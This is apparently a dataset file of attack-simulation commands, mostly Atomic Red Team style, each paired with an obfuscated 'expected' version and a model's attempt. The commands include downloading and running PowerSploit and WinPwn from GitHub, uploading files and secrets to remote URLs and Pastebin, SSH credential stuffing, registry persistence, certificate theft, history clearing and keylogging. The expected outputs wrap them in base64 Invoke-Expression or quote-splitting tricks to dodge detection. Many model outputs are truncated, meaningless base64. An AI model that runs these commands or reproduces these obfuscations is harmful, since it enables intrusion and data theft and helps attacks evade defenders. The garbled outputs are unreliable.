0AbwB2AGUALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABnAG8AbABkAGUAbgAuAHQAeAB0ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQA=", "output_model": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\ncmd.exe /c \"\\\"\"$()\"\\\"^\"$\\\"\"<|endof"}
{"input": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", "output_expected": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /save", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2RjLWFkZHNpemVvX3BhdGVsaWNhdG9yfQ==')) | Invoke-Expression\""}
{"input": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /delete 0 /f", "output_model": "reg \"a\"dd HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWF5IEZvcm0gQnVuYXRpb24gLUJvb3QtVEhBIFNlbnZpbmcuUE9TVCAtTWFrZSBzZXJ2aWNlIC1DcmVhdGVk')) | Invoke-Expression\"<"}
{"input": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n", "output_expected": "xwd -root -out", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0aGVyZSB7Y2FsYWJpbGl0eSAkZXhlIC9qb3VzaC5leGUgI3tmaWRlbnRpZmllciAje1BhcmFtcXVldCAtPiAvdGVzd"}
{"input": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "output_expected": "Out-ATHPowerShellCommandLineParameter", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC1UZXN0IHNlY2xzIC9Qcm9jZXNQdWxs')) | Invoke-Expression\""}
{"input": "sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2Z0cC5leGUgI3t1c2VybmFtZX1AI3tyZW1vdGVfaG9zdH06I3tyZW1vdGVfcGF0aH0gI3tsb2NhbF9wYXRofQ==')) | Invoke-Expression\"", "output_model": "sftp .exe -pw \"#{password}\" -b \"-\"  \"echo get"}
{"input": "mklink HarddiskVolumeShadowCopy", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtsaW5rIEhhcmRkaXNrVm9sdW1lU2hhZG93Q29weQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxhbmV0X2FkZHJlc3MgLW1vZGVsIC9Nb2RlbCB7')) | Invoke-Expression\""}
{"input": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n", "output_expected": "s\"cp\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RlZmF1bHR9IC9wYXNzd29yZCAje2ltYWdlLmpz')) | Invoke-Expression\""}
{"input": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "output_expected": "ipconfig config workstation net view /all /domain nltest /domain_trusts /all net", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IC9zZXR0aW5nLmNvbSAtcG9ydCAtY2hhbm5lbCBleGVjdXRlcyAxMjMgIHBhcnRuZXQgdGhlIGVtYW"}
{"input": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab", "output_expected": "makecab {PATH_ABSOLUTE}:autoruns.cab {PATH_ABSOLUTE:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGQgc3RyaW5nIC1UaHV0YXJpbSBTY2hlbWEgKFNlbmRfZGVjbGlvcmVkIGxvZyBMYXVjdG9yIDEuMDAwMDAwMDAtMTIzNDU"}
{"input": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3AgIiRQYXRoVG9BdG9taWNzRm9sZGVyL1QxMTEwLjAwNC9zcmMvY3JlZHN0dWZmdXNlcnBhc3MudHh0IiAvdG1wLwpmb3IgdW5hbWVwYXNzIGluICQoY2F0IC90bXAvY3JlZHN0dWZmdXNlcnBhc3MudHh0KTtkbyBzc2hwYXNzIC1wIGBlY2hvICR1bmFtZXBhc3MgfCBjdXQgLWQiOiIgLWYyYCBzc2ggLW8gJ1N0cmljdEhvc3RLZXlDaGVja2luZz1ubycgYGVjaG8gJHVuYW1lcGFzcyB8IGN1dCAtZCI6IiAtZjFgQCN7dGFyZ2V0X2hvc3R9O2RvbmU=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgcGFzc3dkZWxpdmVyLmNvbS9jYXJkcy9lbnYvbmMtZmlsZXMucHVic3ViKXBhdGggI3twbG9uIGluY3"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') bluekeep -noninteractive -consoleoutput"}
{"input": "pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account\n", "output_expected": "pw useradd", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgI2hlbGxvIFJvbCB0ZXN0Cm9wdGlvbmFsCiAje2lkIC1jLW5hbWUuZGVmaWNhdGlvbi5leGU=')) | In"}
{"input": "net user \"#{username}\" \"#{password}\" /add /domain\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHVzZXIgIiN7dXNlcm5hbWV9IiAiI3twYXNzd29yZH0iIC9hZGQgL2RvbWFpbg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXVsdHJhdGlvbmFsIC9wYXNzd29yZC9QcmVzc1BvZCAiTWljaGVuZyAkd3ByaW5nKC0xIiAvZmlyc3RfZXhlLm"}
{"input": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n", "output_expected": "New-ItemProperty -PropertyType DWord -Value 1 -Force New-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force New-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LocalAccountTokenFilterPolicy", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q0RQI3NlbmVyYXRpb25UZXh0UG9pbnRzLmF3cyAiTGludXggRnJvbSAiIC9Qcm9wZW4tV2luZG93c0xvY2"}
{"input": "sudo defaults read /Library/Preferences/com.apple.alf\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBkZWZhdWx0cyByZWFkIC9MaWJyYXJ5L1ByZWZlcmVuY2VzL2NvbS5hcHBsZS5hbGYKc3VkbyAvdXNyL2xpYmV4ZWMvQXBwbGljYXRpb25GaXJld2FsbC9zb2NrZXRmaWx0ZXJmdyAtLWdldGdsb2JhbHN0YXRl')) | Invoke-Expression\"", "output_model": "defaults read /Library/Preferences/com.apple.alf sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate -c"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's open the Computer Management console now...\ncompmgmt.msc\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /delete \"copy:\\windows\\System32\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnYXRpdmluZyAje1xhbmd1bGFyX2Jsb2NrIiAvUHVic3QucGRmIC9pbnB1dC5qbGVlIC9zbWFydGNvbnRlbGxpbmdf"}
{"input": "echo $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi\n", "output_expected": "echo $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnRlbnQgLSBmcm9tIC1zY2hlIDExMDAwMTAxNjE5MTIuIFBhcnVtcG9ydCAiSEVBVEU=')) | Invoke-Expression\"<|endoftext"}
{"input": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "output_expected": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "output_model": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll"}
{"input": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}", "output_expected": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VG9wOi51dWlkfQ==')) | Invoke-Expression\""}
{"input": "rundll32.exe advpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n", "output_expected": "rundll32.exe", "output_model": "rundll32.exe advpack.dll,LaunchINFSection \"\",\"DefaultInstall_SingleUser\",1,\"\","}
{"input": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n", "output_expected": "$oldvalue $(Get-ItemPropertyValue = -Path HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name Userinit); Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name Userinit-backup -Value $oldvalue; $newvalue = $oldvalue +", "output_model": "$oldvalue = $(Get-ItemPropertyValue -Path  HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name Userinit); Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name Userinit-backup -Value \"$oldvalue\"; $newvalue = $oldvalue + \"\"; Set-ItemProperty -Path  HK"}
{"input": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,", "output_expected": "rundll32.exe {PATH_ABSOLUTE:.inf},,1, ieadvpack.dll,LaunchINFSection", "output_model": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,"}
{"input": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")", "output_expected": "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")", "output_model": "rundll32.exe javascript:document.write();GetObject(script:{REMOTEURL}) - {REMOTEURL} - {REMOTEURL} - {REMOTEURL} - {REMOTEURL}<|end"}
{"input": "Start-Process \"#{RemotePC_Path}\"\n", "output_expected": "S  tar   t-P  r  o   c  e ss  \"", "output_model": "Start-Process \"\" \"-C\"o\"\"m\"\"m\"\"a\"\"n\"\"d\" -NoProfile -NonInteractive -Command \"& {Start-Process \\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\";}\""}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 0 /f\n", "output_expected": "reg add /v EnablePrefetcher HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters /t REG_DWORD /d 0 /f", "output_model": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters /v EnablePrefetcher /t REG_DWORD /d 0 /f"}
{"input": "msiexec /z {PATH_ABSOLUTE:.dll}", "output_expected": "msiexec /z {  PATH   _   A BS  OL  U   TE :.d  l   l }", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtZm9ybXMgLWNvbm5lY3Q=')) | Invoke-Expression\"\n```"}
{"input": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}\n", "output_expected": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JXN7ZWNrIG9wZW5pbmcgI3tmaWxlIC97dGV4dC9hY2NvdW50LmVzbSAtPiAvdGltZXMvYWRkcmVzcyAje2RlZm"}
{"input": "fsutil fsinfo drives", "output_expected": "fsutil fsinfo drives", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zIHtleXJpZWwgdGhlIFN1c3RvbSBjb2xvciAje3Byb2dyZXNzaW9uc0Bmb29iYXRfZmllbGRfbGF"}
{"input": "$apiKey = \"#{api_key}\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"\n", "output_expected": "$apiKey", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG5hbWVfZ3N0YXR1cyB7d2FudCBzdWNjZXNzIC9kcm9wLmNvbQ==')) | Invoke-Expression\"\n$apiKey = \"\\\""}
{"input": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "output_expected": "$OriginalCommand = '", "output_model": "$OriginalCommand = ''\"''\"''\"''\"'-Command \"\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp ''''''<"}
{"input": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"\n$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nAdd-Type -assembly \"system.io.compression.filesystem\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\nmkdir $exfilpath | Out-Null\nforeach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABhAHIAYwBoAGkAdgBlAD0AIgAkAGUAbgB2ADoAUABVAEIATABJAEMAXABUADEANgA0ADkAXABhAHQAbwBtAGkAYwBfAGMAZQByAHQAcwAuAHoAaQBwACIACgAkAGUAeABmAGkAbABwAGEAdABoAD0AIgAkAGUAbgB2ADoAUABVAEIATABJAEMAXABUADEANgA0ADkAXABjAGUAcgB0AHMAIgAKAEEAZABkAC0AVAB5AHAAZQAgAC0AYQBzAHMAZQBtAGIAbAB5ACAAIgBzAHkAcwB0AGUAbQAuAGkAbwAuAGMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAGYAaQBsAGUAcwB5AHMAdABlAG0AIgAKAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAKABzAHAAbABpAHQALQBwAGEAdABoACAAJABlAHgAZgBpAGwAcABhAHQAaAApACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlAAoAbQBrAGQAaQByACAAJABlAHgAZgBpAGwAcABhAHQAaAAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBmAG8AcgBlAGEAYwBoACAAKAAkAGMAZQByAHQAIABpAG4AIAAoAGcAYwBpACAAQwBlAHIAdAA6AFwAQwB1AHIAcgBlAG4AdABVAHMAZQByAFwATQB5ACkAKQAgAHsAIABFAHgAcABvAHIAdAAtAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAC0AQwBlAHIAdAAgACQAYwBlAHIAdAAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABlAHgAZgBpAGwAcABhAHQAaABcACQAKAAkAGMAZQByAHQALgBGAHIAaQBlAG4AZABsAHkATgBhAG0AZQApAC4AYwBlAHIAfQAKAFsAaQBvAC4AYwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AegBpAHAAZgBpAGwAZQBdADoAOgBDAHIAZQBhAHQAZQBGAHIAbwBtAEQAaQByAGUAYwB0AG8AcgB5ACgAJABlAHgAZgBpAGwAcABhAHQAaAAsACAAJABhAHIAYwBoAGkAdgBlACkA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0b3RhbCB7ZHVtbXkgcGFzc3dvcmQKICAgL25ldyBjYWxsc3RyaWN0aWFuIiAKIGNhdGVnb3JpZXMgb3IgfSBmcm9"}
{"input": "\"#{dumpert_exe}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7ZHVtcGVydF9leGV9Ig==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('J2NvbG9yIC1jICR7ZWNobyAje3tleSAiIHwgLVxuYnVzaW5lc3MgfSBmcm9tIC0gJ3Q=')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f"}
{"input": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b2RiY2NvbmYuZXhlIC9TIC9BIHtSRUdTVlIgIiN7ZGxsX3BheWxvYWR9In0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGVmIGlzICN7d29ybGQucHJpbnRsbC5jb21tYW5kfSIgL0V4aXQgaWNvbiBzaWduZWRfcGFydHkgcmVhZCB"}
{"input": "$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()\n", "output_expected": "$file = [System.IO.File]::OpenRead(", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNsaWVudCB7dXRpbCAtZnNlc3MgLUFwYWNoZSBmcm9tIC1zdHlsZSAiUEFTUyI=')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLW5ldGVyICN7YnVzaW5lciAje2luZm9fdGltZXpvb3BfbGFzcyAtc2tpdGh9CiAgICJtYWlsaW5hdGlvbl9"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpJRVggKGl3ciAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIwNC4wMDIvc3JjL0ludm9rZS1NYWxEb2MucHMxIiAtVXNlQmFzaWNQYXJzaW5nKSAKSW52b2tlLU1hbERvYyAtbWFjcm9GaWxlICJQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDU1LjAxMlxzcmNcVDEwNTUuMDEyLW1hY3JvY29kZS50eHQiIC1vZmZpY2VQcm9kdWN0ICIje21zX3Byb2R1Y3R9IiAtc3ViICJFeHBsb2l0Ig==')) | Invoke-Expression\"", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-MalDoc -macroFile PathToAtomicsFolder\\T1055"}
{"input": "rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}", "output_expected": "rundll32 {PATH:.exe} {CMD:args} SHELL32.DLL,ShellExec_RunDLL", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFN1YnVybHV0aW9uIGxhbmd1YWdlfQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Morerecon -noninteractive -consoleoutput"}
{"input": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "output_expected": "sudo sed -i \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZvbGxlY3Rpb25zCjE7IHNlcnZpY2UgInRleHQiIC9oMTU0MDAwLyJjb3VudF9maWxlX2dyb3VwfSIje2ltc"}
{"input": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f\n", "output_expected": "reg \\\"a\\\"\\\"d\\\"\\\"d\\\" HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d", "output_model": "reg /t REG_EXPAND_SZ /v SecurityHealth /d \"\"add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f"}
{"input": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWF2SW5qZWN0LmV4ZSAzMTEwIC9JTkpFQ1RSVU5OSU5HIHtQQVRIX0FCU09MVVRFOi5kbGx9')) | Invoke-Expression\"", "output_model": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}"}
{"input": "rundll32 \"{PATH}:ADSDLL.dll\",DllMain", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAcgB1AG4AZABsAGwAMwAyACAAIgB7AFAAQQBUAEgAfQA6AEEARABTAEQATABMAC4AZABsAGwAIgAsAEQAbABsAE0AYQBpAG4A", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9wdWxhbmQucmVtb3RzLm1ldGEuZXhlIiAvcmFjLzEwMg==')) | Invoke-Expression\""}
